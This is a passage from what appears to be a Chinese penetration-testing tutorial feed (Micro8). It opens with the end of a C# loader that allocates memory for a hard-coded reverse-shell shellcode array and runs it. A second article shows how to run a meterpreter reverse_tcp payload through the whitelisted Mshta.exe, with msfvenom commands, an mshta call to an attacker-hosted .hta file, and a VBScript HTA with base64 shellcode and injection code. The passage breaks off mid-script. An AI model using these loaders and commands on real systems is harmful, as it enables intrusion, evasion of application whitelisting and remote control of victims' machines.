class="meta">DllImport(<span class="meta-string">"kernel32"</span>)</span>] <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">extern</span> <span class="keyword">bool</span> <span class="title">VirtualProtect</span>(<span class="params">IntPt rDStOGXQMMkP, <span class="keyword">uint</span> CzzIpcuQppQSTBJ, <span class="keyword">uint</span> JCFImGhkRqtwANx, <span class="keyword">out</span> <span class="keyword">uint</span> exgVp Sg</span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">"kernel32"</span>)</span>]<span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> IntPtr <span class="title">CreateThread</span>(<span class="params">UInt32 eisuQbXKYbAvA, UInt32 WQATOZaFz, IntPtr AEGJQOn,IntPtr SYcfyeeSgPl, UInt32 ZSheqBwKtDf, <span class="keyword">ref</span> UInt32 SZtdSB</span>)</span>;</span><br><span class="line"></span><br><span class="line">[<span class="meta">DllImport(<span class="meta-string">"kernel32"</span>)</span>] <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">extern</span> UInt32 <span class="title">WaitForSingleObject</span>(<span class="params">IntPtr KqJNFlHpsKOV, UInt32 EYBOArlCLAM</span>)</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="title">yrDaTlg</span>(<span class="params"></span>)</span> &#123;</span><br><span class="line"></span><br><span class="line"><span class="keyword">byte</span>[] QWKpWKhcs =</span><br><span class="line"></span><br><span class="line">&#123;<span class="number">0xfc</span>,<span class="number">0x48</span>,<span class="number">0x83</span>,<span class="number">0xe4</span>,<span class="number">0xf0</span>,<span class="number">0xe8</span>,<span class="number">0xcc</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x41</span>,<span class="number">0x51</span>,<span class="number">0x41</span>,<span class="number">0x50</span>,<span class="number">0x52</span>,</span><br><span class="line"></span><br><span class="line"><span class="number">0x51</span>,<span class="number">0x56</span>,<span class="number">0x48</span>,<span class="number">0x31</span>,<span class="number">0xd2</span>,<span class="number">0x65</span>,<span class="number">0x48</span>,<span class="number">0x8b</span>,<span class="number">0x52</span>,<span class="number">0x60</span>,<span class="number">0x48</span>,<span class="number">0x8b</span>,<span class="number">0x52</span>,<span class="number">0x18</span>,x48,</span><br><span class="line"></span><br><span class="line"><span class="number">0x8b</span>,<span class="number">0x52</span>,<span class="number">0x20</span>,<span class="number">0x48</span>,<span class="number">0x8b</span>,<span class="number">0x72</span>,<span class="number">0x50</span>,<span class="number">0x48</span>,<span class="number">0x0f</span>,<span class="number">0xb7</span>,<span class="number">0x4a</span>,<span class="number">0x4a</span>,<span class="number">0x4d</span>,<span class="number">0x31</span>,xc9,</span><br><span class="line"></span><br><span class="line"><span class="number">0x48</span>,<span class="number">0x31</span>,<span class="number">0xc0</span>,<span class="number">0xac</span>,<span class="number">0x3c</span>,<span class="number">0x61</span>,<span class="number">0x7c</span>,<span class="number">0x02</span>,<span class="number">0x2c</span>,<span class="number">0x20</span>,<span class="number">0x41</span>,<span class="number">0xc1</span>,<span class="number">0xc9</span>,<span class="number">0x0d</span>,x41,</span><br><span class="line"></span><br><span class="line"><span class="number">0x01</span>,<span class="number">0xc1</span>,<span class="number">0xe2</span>,<span class="number">0xed</span>,<span class="number">0x52</span>,<span class="number">0x41</span>,<span class="number">0x51</span>,<span class="number">0x48</span>,<span class="number">0x8b</span>,<span class="number">0x52</span>,<span class="number">0x20</span>,<span class="number">0x8b</span>,<span class="number">0x42</span>,<span class="number">0x3c</span>,x48,</span><br><span class="line"></span><br><span class="line"><span class="number">0x01</span>,<span class="number">0xd0</span>,<span class="number">0x66</span>,<span class="number">0x81</span>,<span class="number">0x78</span>,<span class="number">0x18</span>,<span class="number">0x0b</span>,<span class="number">0x02</span>,<span class="number">0x0f</span>,<span class="number">0x85</span>,<span class="number">0x72</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,x8b,</span><br><span class="line"></span><br><span class="line"><span class="number">0x80</span>,<span class="number">0x88</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x48</span>,<span class="number">0x85</span>,<span class="number">0xc0</span>,<span class="number">0x74</span>,<span class="number">0x67</span>,<span class="number">0x48</span>,<span class="number">0x01</span>,<span class="number">0xd0</span>,<span class="number">0x50</span>,x8b,</span><br><span class="line"></span><br><span class="line"><span class="number">0x48</span>,<span class="number">0x18</span>,<span class="number">0x44</span>,<span class="number">0x8b</span>,<span class="number">0x40</span>,<span class="number">0x20</span>,<span class="number">0x49</span>,<span class="number">0x01</span>,<span class="number">0xd0</span>,<span class="number">0xe3</span>,<span class="number">0x56</span>,<span class="number">0x48</span>,<span class="number">0xff</span>,<span class="number">0xc9</span>,x41,</span><br><span class="line"></span><br><span class="line"><span class="number">0x8b</span>,<span class="number">0x34</span>,<span class="number">0x88</span>,<span class="number">0x48</span>,<span class="number">0x01</span>,<span class="number">0xd6</span>,<span class="number">0x4d</span>,<span class="number">0x31</span>,<span class="number">0xc9</span>,<span class="number">0x48</span>,<span class="number">0x31</span>,<span class="number">0xc0</span>,<span class="number">0xac</span>,<span class="number">0x41</span>,xc1,</span><br><span class="line"></span><br><span class="line"><span class="number">0xc9</span>,<span class="number">0x0d</span>,<span class="number">0x41</span>,<span class="number">0x01</span>,<span class="number">0xc1</span>,<span class="number">0x38</span>,<span class="number">0xe0</span>,<span class="number">0x75</span>,<span class="number">0xf1</span>,<span class="number">0x4c</span>,<span class="number">0x03</span>,<span class="number">0x4c</span>,<span class="number">0x24</span>,<span class="number">0x08</span>,x45,</span><br><span class="line"></span><br><span class="line"><span class="number">0x39</span>,<span class="number">0xd1</span>,<span class="number">0x75</span>,<span class="number">0xd8</span>,<span class="number">0x58</span>,<span class="number">0x44</span>,<span class="number">0x8b</span>,<span class="number">0x40</span>,<span class="number">0x24</span>,<span class="number">0x49</span>,<span class="number">0x01</span>,<span class="number">0xd0</span>,<span class="number">0x66</span>,<span class="number">0x41</span>,x8b,</span><br><span class="line"></span><br><span class="line"><span class="number">0x0c</span>,<span class="number">0x48</span>,<span class="number">0x44</span>,<span class="number">0x8b</span>,<span class="number">0x40</span>,<span class="number">0x1c</span>,<span class="number">0x49</span>,<span class="number">0x01</span>,<span class="number">0xd0</span>,<span class="number">0x41</span>,<span class="number">0x8b</span>,<span class="number">0x04</span>,<span class="number">0x88</span>,<span class="number">0x48</span>,x01,</span><br><span class="line"></span><br><span class="line"><span class="number">0xd0</span>,<span class="number">0x41</span>,<span class="number">0x58</span>,<span class="number">0x41</span>,<span class="number">0x58</span>,<span class="number">0x5e</span>,<span class="number">0x59</span>,<span class="number">0x5a</span>,<span class="number">0x41</span>,<span class="number">0x58</span>,<span class="number">0x41</span>,<span class="number">0x59</span>,<span class="number">0x41</span>,<span class="number">0x5a</span>,x48,</span><br><span class="line"></span><br><span class="line"><span class="number">0x83</span>,<span class="number">0xec</span>,<span class="number">0x20</span>,<span class="number">0x41</span>,<span class="number">0x52</span>,<span class="number">0xff</span>,<span class="number">0xe0</span>,<span class="number">0x58</span>,<span class="number">0x41</span>,<span class="number">0x59</span>,<span class="number">0x5a</span>,<span class="number">0x48</span>,<span class="number">0x8b</span>,<span class="number">0x12</span>,xe9,</span><br><span class="line"></span><br><span class="line"><span class="number">0x4b</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0x5d</span>,<span class="number">0x49</span>,<span class="number">0xbe</span>,<span class="number">0x77</span>,<span class="number">0x73</span>,<span class="number">0x32</span>,<span class="number">0x5f</span>,<span class="number">0x33</span>,<span class="number">0x32</span>,<span class="number">0x00</span>,x00,</span><br><span class="line"></span><br><span class="line"><span class="number">0x41</span>,<span class="number">0x56</span>,<span class="number">0x49</span>,<span class="number">0x89</span>,<span class="number">0xe6</span>,<span class="number">0x48</span>,<span class="number">0x81</span>,<span class="number">0xec</span>,<span class="number">0xa0</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x49</span>,<span class="number">0x89</span>,xe5,</span><br><span class="line"></span><br><span class="line"><span class="number">0x49</span>,<span class="number">0xbc</span>,<span class="number">0x02</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x35</span>,<span class="number">0xc0</span>,<span class="number">0xa8</span>,<span class="number">0x01</span>,<span class="number">0x04</span>,<span class="number">0x41</span>,<span class="number">0x54</span>,<span class="number">0x49</span>,<span class="number">0x89</span>,xe4,</span><br><span class="line"></span><br><span class="line"><span class="number">0x4c</span>,<span class="number">0x89</span>,<span class="number">0xf1</span>,<span class="number">0x41</span>,<span class="number">0xba</span>,<span class="number">0x4c</span>,<span class="number">0x77</span>,<span class="number">0x26</span>,<span class="number">0x07</span>,<span class="number">0xff</span>,<span class="number">0xd5</span>,<span class="number">0x4c</span>,<span class="number">0x89</span>,<span class="number">0xea</span>,x68,</span><br><span class="line"></span><br><span class="line"><span class="number">0x01</span>,<span class="number">0x01</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x59</span>,<span class="number">0x41</span>,<span class="number">0xba</span>,<span class="number">0x29</span>,<span class="number">0x80</span>,<span class="number">0x6b</span>,<span class="number">0x00</span>,<span class="number">0xff</span>,<span class="number">0xd5</span>,<span class="number">0x6a</span>,x0a,</span><br><span class="line"></span><br><span class="line"><span class="number">0x41</span>,<span class="number">0x5e</span>,<span class="number">0x50</span>,<span class="number">0x50</span>,<span class="number">0x4d</span>,<span class="number">0x31</span>,<span class="number">0xc9</span>,<span class="number">0x4d</span>,<span class="number">0x31</span>,<span class="number">0xc0</span>,<span class="number">0x48</span>,<span class="number">0xff</span>,<span class="number">0xc0</span>,<span class="number">0x48</span>,x89,</span><br><span class="line"></span><br><span class="line"><span class="number">0xc2</span>,<span class="number">0x48</span>,<span class="number">0xff</span>,<span class="number">0xc0</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xc1</span>,<span class="number">0x41</span>,<span class="number">0xba</span>,<span class="number">0xea</span>,<span class="number">0x0f</span>,<span class="number">0xdf</span>,<span class="number">0xe0</span>,<span class="number">0xff</span>,xd5,</span><br><span class="line"></span><br><span class="line"><span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xc7</span>,<span class="number">0x6a</span>,<span class="number">0x10</span>,<span class="number">0x41</span>,<span class="number">0x58</span>,<span class="number">0x4c</span>,<span class="number">0x89</span>,<span class="number">0xe2</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xf9</span>,<span class="number">0x41</span>,xba,</span><br><span class="line"></span><br><span class="line"><span class="number">0x99</span>,<span class="number">0xa5</span>,<span class="number">0x74</span>,<span class="number">0x61</span>,<span class="number">0xff</span>,<span class="number">0xd5</span>,<span class="number">0x85</span>,<span class="number">0xc0</span>,<span class="number">0x74</span>,<span class="number">0x0a</span>,<span class="number">0x49</span>,<span class="number">0xff</span>,<span class="number">0xce</span>,<span class="number">0x75</span>,xe5,</span><br><span class="line"></span><br><span class="line"><span class="number">0xe8</span>,<span class="number">0x93</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x48</span>,<span class="number">0x83</span>,<span class="number">0xec</span>,<span class="number">0x10</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xe2</span>,<span class="number">0x4d</span>,<span class="number">0x31</span>,xc9,</span><br><span class="line"></span><br><span class="line"><span class="number">0x6a</span>,<span class="number">0x04</span>,<span class="number">0x41</span>,<span class="number">0x58</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xf9</span>,<span class="number">0x41</span>,<span class="number">0xba</span>,<span class="number">0x02</span>,<span class="number">0xd9</span>,<span class="number">0xc8</span>,<span class="number">0x5f</span>,<span class="number">0xff</span>,xd5,</span><br><span class="line"></span><br><span class="line"><span class="number">0x83</span>,<span class="number">0xf8</span>,<span class="number">0x00</span>,<span class="number">0x7e</span>,<span class="number">0x55</span>,<span class="number">0x48</span>,<span class="number">0x83</span>,<span class="number">0xc4</span>,<span class="number">0x20</span>,<span class="number">0x5e</span>,<span class="number">0x89</span>,<span class="number">0xf6</span>,<span class="number">0x6a</span>,<span class="number">0x40</span>,x41,</span><br><span class="line"></span><br><span class="line"><span class="number">0x59</span>,<span class="number">0x68</span>,<span class="number">0x00</span>,<span class="number">0x10</span>,<span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x41</span>,<span class="number">0x58</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xf2</span>,<span class="number">0x48</span>,<span class="number">0x31</span>,<span class="number">0xc9</span>,x41,</span><br><span class="line"></span><br><span class="line"><span class="number">0xba</span>,<span class="number">0x58</span>,<span class="number">0xa4</span>,<span class="number">0x53</span>,<span class="number">0xe5</span>,<span class="number">0xff</span>,<span class="number">0xd5</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xc3</span>,<span class="number">0x49</span>,<span class="number">0x89</span>,<span class="number">0xc7</span>,<span class="number">0x4d</span>,x31,</span><br><span class="line"></span><br><span class="line"><span class="number">0xc9</span>,<span class="number">0x49</span>,<span class="number">0x89</span>,<span class="number">0xf0</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xda</span>,<span class="number">0x48</span>,<span class="number">0x89</span>,<span class="number">0xf9</span>,<span class="number">0x41</span>,<span class="number">0xba</span>,<span class="number">0x02</span>,<span class="number">0xd9</span>,xc8,</span><br><span class="line"></span><br><span class="line"><span class="number">0x5f</span>,<span class="number">0xff</span>,<span class="number">0xd5</span>,<span class="number">0x83</span>,<span class="number">0xf8</span>,<span class="number">0x00</span>,<span class="number">0x7d</span>,<span class="number">0x28</span>,<span class="number">0x58</span>,<span class="number">0x41</span>,<span class="number">0x57</span>,<span class="number">0x59</span>,<span class="number">0x68</span>,<span class="number">0x00</span>,x40,</span><br><span class="line"></span><br><span class="line"><span class="number">0x00</span>,<span class="number">0x00</span>,<span class="number">0x41</span>,<span class="number">0x58</span>,<span class="number">0x6a</span>,<span class="number">0x00</span>,<span class="number">0x5a</span>,<span class="number">0x41</span>,<span class="number">0xba</span>,<span class="number">0x0b</span>,<span class="number">0x2f</span>,<span class="number">0x0f</span>,<span class="number">0x30</span>,<span class="number">0xff</span>,xd5,</span><br><span class="line"></span><br><span class="line"><span class="number">0x57</span>,<span class="number">0x59</span>,<span class="number">0x41</span>,<span class="number">0xba</span>,<span class="number">0x75</span>,<span class="number">0x6e</span>,<span class="number">0x4d</span>,<span class="number">0x61</span>,<span class="number">0xff</span>,<span class="number">0xd5</span>,<span class="number">0x49</span>,<span class="number">0xff</span>,<span class="number">0xce</span>,<span class="number">0xe9</span>,x3c,</span><br><span class="line"></span><br><span class="line"><span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0xff</span>,<span class="number">0x48</span>,<span class="number">0x01</span>,<span class="number">0xc3</span>,<span class="number">0x48</span>,<span class="number">0x29</span>,<span class="number">0xc6</span>,<span class="number">0x48</span>,<span class="number">0x85</span>,<span class="number">0xf6</span>,<span class="number">0x75</span>,<span class="number">0xb4</span>,x41,</span><br><span class="line"></span><br><span class="line"><span class="number">0xff</span>,<span class="number">0xe7</span>,<span class="number">0x58</span>,<span class="number">0x6a</span>,<span class="number">0x00</span>,<span class="number">0x59</span>,<span class="number">0x49</span>,<span class="number">0xc7</span>,<span class="number">0xc2</span>,<span class="number">0xf0</span>,<span class="number">0xb5</span>,<span class="number">0xa2</span>,<span class="number">0x56</span>,<span class="number">0xff</span>,xd5&#125;;</span><br><span class="line"></span><br><span class="line">IntPtr AmnGaO = VirtualAlloc(<span class="number">0</span>, (UInt32)QWKpWKhcs.Length, <span class="number">0x3000</span>, <span class="number">0x04</span>);</span><br><span class="line"></span><br><span class="line">Marshal.Copy(QWKpWKhcs, <span class="number">0</span>, (IntPtr)(AmnGaO), QWKpWKhcs.Length);</span><br><span class="line"></span><br><span class="line">IntPtr oXmoNUYvivZlXj = IntPtr.Zero; UInt32 XVXTOi = <span class="number">0</span>; IntPtr pAeCTf wBS = IntPtr.Zero;</span><br><span class="line"></span><br><span class="line"><span class="keyword">uint</span> BnhanUiUJaetgy;</span><br><span class="line"></span><br><span class="line"><span class="keyword">bool</span> iSdNUQK = VirtualProtect(AmnGaO, (<span class="keyword">uint</span>)<span class="number">0x1000</span>, (<span class="keyword">uint</span>)<span class="number">0x20</span>, <span class="keyword">out</span> BnhanUiUJaetgy);</span><br><span class="line"></span><br><span class="line">oXmoNUYvivZlXj = CreateThread(<span class="number">0</span>, <span class="number">0</span>, AmnGaO, pAeCTfwBS, <span class="number">0</span>, <span class="keyword">ref</span> XVXTOi);</span><br><span class="line"></span><br><span class="line">WaitForSingleObject(oXmoNUYvivZlXj, <span class="number">0xFFFFFFFF</span>);&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Micropoor</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> Micro8 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>75、基于白名单Mshta.exe执行payload第五季</title>
      <link href="/article/75_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%BA%94%E5%AD%A3.html"/>
      <url>/article/75_%E5%9F%BA%E4%BA%8E%E7%99%BD%E5%90%8D%E5%8D%95Mshta.exe%E6%89%A7%E8%A1%8Cpayload%E7%AC%AC%E4%BA%94%E5%AD%A3.html</url>
      
        <content type="html"><![CDATA[<h3 id="Mshta简介："><a href="#Mshta简介：" class="headerlink" title="Mshta简介："></a>Mshta简介：</h3><p>Mshta.exe是微软Windows操作系统相关程序，英文全称Microsoft HTML Application，可翻译为微软超文本标记语言应用，用于执行.HTA文件。</p><p><strong>说明：</strong>Mshta所在路径已被系统添加PATH环境变量中，因此，可直接执行Mshta.exe命令。</p><p>基于白名单Mshta.exe配置payload：</p><p>Windows 7 默认位置：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">C:\Windows\System32\mshta.exe</span><br><span class="line">C:\Windows\SysWOW64\mshta.exe</span><br></pre></td></tr></table></figure><p><strong>攻击机：</strong>192.168.1.4 Debian<br><strong>靶机：</strong> 192.168.1.3 Windows 7</p><h3 id="配置攻击机msf："><a href="#配置攻击机msf：" class="headerlink" title="配置攻击机msf："></a>配置攻击机msf：</h3><p><img src="../do/media/f245f8669131b9479df5938aeaa46e04.jpg" alt></p><h3 id="配置payload："><a href="#配置payload：" class="headerlink" title="配置payload："></a>配置payload：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom ‐a x86 ‐‐platform windows ‐p windows/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=53 ‐f raw &gt; shellcode.bin</span><br></pre></td></tr></table></figure><p><img src="../do/media/bb0de086b8d214f602a32b1e969bf8e3.jpg" alt></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cat shellcode.bin |base64 ‐w 0</span><br></pre></td></tr></table></figure><p><img src="../do/media/a082e7172c33c803848cbb3137e0350a.jpg" alt></p><p>替换如下：<br><img src="../do/media/db40efa36fb44a78de6ad92e0703e070.jpg" alt></p><h3 id="靶机执行："><a href="#靶机执行：" class="headerlink" title="靶机执行："></a>靶机执行：</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">mshta.exe http://192.168.1.4/Micropoor.hta</span><br></pre></td></tr></table></figure><p><img src="../do/media/555b1ac76b6f56f92f49c6bda5e8f91f.jpg" alt></p><h3 id="附录：Micropoor-hta"><a href="#附录：Micropoor-hta" class="headerlink" title="附录：Micropoor.hta"></a>附录：Micropoor.hta</h3><p><strong>注：x86 payload</strong></p><figure class="highlight plain"><figcaption><span>basic</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br><span class="line">229</span><br><span class="line">230</span><br><span class="line">231</span><br><span class="line">232</span><br><span class="line">233</span><br><span class="line">234</span><br><span class="line">235</span><br><span class="line">236</span><br><span class="line">237</span><br><span class="line">238</span><br><span class="line">239</span><br><span class="line">240</span><br><span class="line">241</span><br><span class="line">242</span><br><span class="line">243</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=&quot;VBScript&quot;&gt;</span><br><span class="line"></span><br><span class="line">&apos; Usage:</span><br><span class="line">&apos; Choose a binary you want to inject into, default &quot;rundll32.exe&quot;, you can use note pad.exe, calc.exe for example...</span><br><span class="line">&apos; Generate a 32 bit raw shellcode in whatever framework you want. Tested: Cobalt St rike, Metasploit Framework</span><br><span class="line">&apos; Run: cat payload.bin | base64 ‐w 0</span><br><span class="line">&apos; Copy the base64 encoded payload into the code variable below.</span><br><span class="line">&apos; Replace with binary name that you want to inject into. This can be anything that exists both in SYSWOW64 and SYSTEM32</span><br><span class="line">Dim binary : binary = &quot;rundll32.exe&quot;</span><br><span class="line"></span><br><span class="line">&apos; Base64 encoded 32 bit shellcode</span><br><span class="line"></span><br><span class="line">Dim code : code = &quot;/OiCAAAAYInlMcBki1Awi1IMi1IUi3IoD7dKJjH/rDxhfAIsIMHPDQHH4vJSV4tSEItKPItMEXjjSAHRUYtZIAHTi0kY4zpJizSLAdYx/6zBzw0BxzjgdfYDffg7fSR15FiLWCQB02aLDEuLWBwB04sEiwHQiUQkJFtbYVlaUf/gX19aixLrjV1oMzIAAGh3czJfVGhMdyYHiej/0LiQAQAAKcRUUGgpgGsA/9VqCmjAqAEEaAIAADWJ5lBQUFBAUEBQaOoP3+D/1ZdqEFZXaJmldGH/1YXAdAr/Tgh17OhnAAAAagBqBFZXaALZyF//1Y</span><br><span class="line">P4AH42izZqQGgAEAAAVmoAaFikU+X/1ZNTagBWU1doAtnIX//Vg/gAfShYaABAAABqAFBoCy8PMP/VV2h1bk1h/9VeXv8MJA+FcP///+mb////AcMpxnXBw7vwtaJWagBT/9U=&quot;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Sub Debug(s)</span><br><span class="line"></span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Sub SetVersion</span><br><span class="line"></span><br><span class="line">End Sub</span><br><span class="line"></span><br><span class="line">Function Base64ToStream(b)</span><br><span class="line"></span><br><span class="line">Dim enc, length, ba, transform, ms</span><br><span class="line"></span><br><span class="line">Set enc = CreateObject(&quot;System.Text.ASCIIEncoding&quot;)</span><br><span class="line"></span><br><span class="line">length = enc.GetByteCount_2(b)</span><br><span class="line"></span><br><span class="line">Set transform = CreateObject(&quot;System.Security.Cryptography.FromBase64Transform&quot;)</span><br><span class="line"></span><br><span class="line">Set ms = CreateObject(&quot;System.IO.MemoryStream&quot;)</span><br><span class="line"></span><br><span class="line">ms.Write transform.TransformFinalBlock(enc.GetBytes_4(b), 0, length), 0, ((length / 4) * 3)</span><br><span class="line"></span><br><span class="line">ms.Position = 0</span><br><span class="line"></span><br><span class="line">Set Base64ToStream = ms</span><br><span class="line"></span><br><span class="line">End Function</span><br><span class="line"></span><br><span class="line">Sub Run</span><br><span class="line"></span><br><span class="line">Dim s, entry_class</span><br><span class="line"></span><br><span class="line">s = &quot;AAEAAAD/////AQAAAAAAAAAEAQAAACJTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVy&quot;</span><br><span class="line">s = s &amp; &quot;AwAAAAhEZWxlZ2F0ZQd0YXJnZXQwB21ldGhvZDADAwMwU3lzdGVtLkRlbGVnYXRlU2VyaWFsaXph&quot;</span><br><span class="line">s = s &amp; &quot;dGlvbkhvbGRlcitEZWxlZ2F0ZUVudHJ5IlN5c3RlbS5EZWxlZ2F0ZVNlcmlhbGl6YXRpb25Ib2xk&quot;</span><br><span class="line">s = s &amp; &quot;ZXIvU3lzdGVtLlJlZmxlY3Rpb24uTWVtYmVySW5mb1NlcmlhbGl6YXRpb25Ib2xkZXIJAgAAAAkD&quot;</span><br><span class="line">s = s &amp; &quot;AAAACQQAAAAEAgAAADBTeXN0ZW0uRGVsZWdhdGVTZXJpYWxpemF0aW9uSG9sZGVyK0RlbGVnYXRl&quot;</span><br><span class="line">s = s &amp; &quot;RW50cnkHAAAABHR5cGUIYXNzZW1ibHkGdGFyZ2V0EnRhcmdldFR5cGVBc3NlbWJseQ50YXJnZXRU&quot;</span><br><span class="line">s = s &amp; 